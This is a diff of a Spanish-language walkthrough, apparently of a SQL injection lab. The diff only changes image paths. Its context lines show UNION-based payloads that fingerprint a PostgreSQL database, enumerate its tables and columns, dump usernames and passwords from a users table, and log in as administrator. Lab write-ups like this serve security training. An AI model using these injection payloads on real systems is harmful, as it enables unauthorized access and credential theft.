@@ -39,7 +39,7 @@ PostgreSQL:
 ' union select version(),null -- -
 ```
 
-![Versión PostgreSQL](./Imagenes/pasted-image-20260331172016.png)
+![Versión PostgreSQL](../../../../Imagenes/pasted-image-20260331172016.png)
 
 ---
 
@@ -49,7 +49,7 @@ PostgreSQL:
 ' union select table_name,null from information_schema.tables -- -
 ```
 
-![Listado tablas](./Imagenes/pasted-image-20260331172912.png)
+![Listado tablas](../../../../Imagenes/pasted-image-20260331172912.png)
 
 ---
 
@@ -61,7 +61,7 @@ Identificamos:
 USERS_LETRASALEATORIAS
 ```
 
-![Tabla users](./Imagenes/pasted-image-20260331172948.png)
+![Tabla users](../../../../Imagenes/pasted-image-20260331172948.png)
 
 ---
 
@@ -71,7 +71,7 @@ USERS_LETRASALEATORIAS
 ' union select column_name,null from information_schema.columns where table_name='users_LETRASALEATORIAS' -- -
 ```
 
-![Columnas tabla](./Imagenes/pasted-image-20260331173008.png)
+![Columnas tabla](../../../../Imagenes/pasted-image-20260331173008.png)
 
 ---
 
@@ -81,13 +81,13 @@ USERS_LETRASALEATORIAS
 ' union select username,password from users_LETRASALEATORIAS -- -
 ```
 
-![Credenciales](./Imagenes/pasted-image-20260331173252.png)
+![Credenciales](../../../../Imagenes/pasted-image-20260331173252.png)
 
 ---
 
 ## 🔓 Acceso administrador
 
-![Login exitoso](./Imagenes/pasted-image-20260331173338.png)
+![Login exitoso](../../../../Imagenes/pasted-image-20260331173338.png)
 
 ---
 
